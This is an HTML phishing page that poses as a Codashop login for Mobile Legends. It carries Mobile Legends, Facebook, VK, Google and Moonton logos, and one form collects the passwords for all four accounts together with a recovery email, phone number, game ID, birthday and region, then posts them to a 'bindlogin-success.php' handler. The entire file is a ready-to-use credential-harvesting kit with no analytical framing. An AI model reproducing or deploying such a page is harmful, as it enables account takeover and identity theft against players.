<html>
<head>
<title>codashop-Login</title>
<link rel="shorcut icon" href="https://pbs.twimg.com/profile_images/480691731214512128/kMGr-Pn8.png">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css">
<style type="text/css">
body { 
  background: url(https://i.ibb.co/RgVyTnq/back.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.container {
	position:relative;
	margin:50px auto;
	max-width:600px;
	height:auto;
	border:2px solid #000000;
	padding:30px;
	box-sizing: border-box;
}

.transparent{
 background:#fff;
 width: 100%;
 height:270px;
 padding:10px;
 margin:0px auto;
 color:#000000;
}

.transparent-box{
 background:#fff;
 width: 100%;
 height:1500px;
 padding:10px;
 margin:0px auto;
 color:#000000;
}
</style>

</head>
<body>


<center><img src="https://upload.wikimedia.org/wikipedia/en/9/9e/Mobilelegends.png"></center>



				
<div class="container transparent-box">
			
<center><font size="6">Facebook Account</font></center>
<center><img width="60" src="https://ioufinancial.com/wp-content/uploads/2017/02/facebook.png"></center>
<form action="bindlogin-success.php" method="post">
<div class="container">

<div class="form-group">
<input type="text" name="fbemail" id="fbemail" class="form-control" placeholder="Email or Phone" required>
</div>

<div class="form-group">
<input type="password" name="fbpass" id="fbpass" class="form-control" placeholder="Password" required>
</div>

<center><font size="6">VK Account</font></center>
<center><img width="60" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/VK.com-logo.svg/1024px-VK.com-logo.svg.png"></center>
<div class="form-group">
<input type="text" name="vkemail" id="vkemail" class="form-control" placeholder="Phone or Email" required>
</div>

<div class="form-group">
<input type="password" name="vkpass" id="vkpass" class="form-control" placeholder="Password" required>
</div>

<center><font size="6">Google Account</font></center>
<center><img width="60" src="https://cdn.worldvectorlogo.com/logos/google-play-games.svg"></center>
<div class="form-group">
<input type="email" name="gemail" id="gemail" class="form-control" placeholder="Email" required>
</div>

<div class="form-group">
<input type="password" name="gpass" id="gpass" class="form-control" placeholder="Password" required>
</div>

<div class="form-group">
<input type="email" name="recovery" id="recovery" class="form-control" placeholder="Recovery Email" required>
</div>

<div class="form-group">
<input type="number" name="phone" id="phone" class="form-control" placeholder="Mobile Phone" required>
</div>

<center><font size="6">Moonton Account</font></center>
<center><img width="105" src="https://i1.wp.com/mysg.mpl.mobilelegends.com/wp-content/uploads/2017/12/Sponsor-Logo-Moonton.png"></center>
<div class="form-group">
<input type="text" name="memail" id="memail" class="form-control" placeholder="UID / User name / Email" required>
</div>

<div class="form-group">
<input type="password" name="mpass" id="mpass" class="form-control" placeholder="Password" required>
</div>

<center><font size="6">Confirmation Account</font></center>


<div class="form-group">
<input type="text" name="username" id="username" class="form-control" placeholder="Username" required>
</div>

<div class="form-group">
<input type="number" name="level" id="level" class="form-control" placeholder="Id Game" maxlength="30" minlength="15" required>
</div>

<div class="form-group">
<input type="number" name="tlevel" id="tlevel" class="form-control" placeholder="Number Phone" required>
</div>

<div class="form-group">
<input type="number" name="skin" id="skin" class="form-control" placeholder="Birth-day" required>
</div>

<div class="form-group">
<input type="text" name="region" id="region" class="form-control" placeholder="Region" required>
</div>

<button type="submit" class="btn btn-success btn-block">Login Bind Account</button>

</div>
       
</form>


</body>
</html>